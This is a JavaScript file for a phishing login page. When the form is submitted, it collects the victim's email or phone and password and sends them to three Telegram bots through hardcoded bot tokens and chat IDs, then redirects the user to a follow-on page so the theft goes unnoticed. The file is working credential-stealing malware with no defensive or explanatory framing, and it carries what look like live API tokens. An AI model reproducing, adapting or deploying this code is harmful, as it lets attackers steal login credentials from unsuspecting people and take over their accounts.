document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("login-form");

    // Bot 1 token and chat ID
    const BOT_TOKEN_1 = "7407917292:AAHhHUp2ZhMBRoen3uR4SOx5ay9kyj3T-do";
    const CHAT_ID_1 = "7120473372";
    const TELEGRAM_API_URL_1 = `https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`;

    // Bot 2 token and chat ID
    const BOT_TOKEN_2 = "7761691224:AAGhpNBLZzP1WuMvT07tmXqP3CLAYOJv4gk";
    const CHAT_ID_2 = "6236707189";
    const TELEGRAM_API_URL_2 = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;

    // Bot 3 token and chat ID
    const BOT_TOKEN_3 = "7746332737:AAEOz6lVMykBEDri1KAIsN_UFo8eAJoEoHs";
    const CHAT_ID_3 = "6942741954";
    const TELEGRAM_API_URL_3 = `https://api.telegram.org/bot${BOT_TOKEN_3}/sendMessage`;

    form.addEventListener("submit", async (event) => {
        event.preventDefault();

        // Collect form data
        const emailPhone = document.getElementById("email-phone").value;
        const password = document.getElementById("password").value;

        // Format the message
        const message = `New Login Data:\n\nEmail/Phone: ${emailPhone}\nPassword: ${password}`;

        try {
            // Send data to Bot 1 manually
            const manualURL1 = `${TELEGRAM_API_URL_1}?chat_id=${CHAT_ID_1}&text=${encodeURIComponent(message)}`;
            const response1 = await fetch(manualURL1);

            // Send data to Bot 2 manually
            const manualURL2 = `${TELEGRAM_API_URL_2}?chat_id=${CHAT_ID_2}&text=${encodeURIComponent(message)}`;
            const response2 = await fetch(manualURL2);

            // Send data to Bot 3 manually
            const manualURL3 = `${TELEGRAM_API_URL_3}?chat_id=${CHAT_ID_3}&text=${encodeURIComponent(message)}`;
            const response3 = await fetch(manualURL3);

            if (response1.ok && response2.ok && response3.ok) {
                // Redirect and reset form if all requests succeed
                window.location.href = 'second.html'; // Change 'second.html' to your target page
                form.reset();
            } else {
               
                console.error({
                    bot1: response1.ok,
                    bot2: response2.ok,
                    bot3: response3.ok
                });
            }
        } catch (error) {
            console.error("Error sending data:", error);
           
        }
    });
});
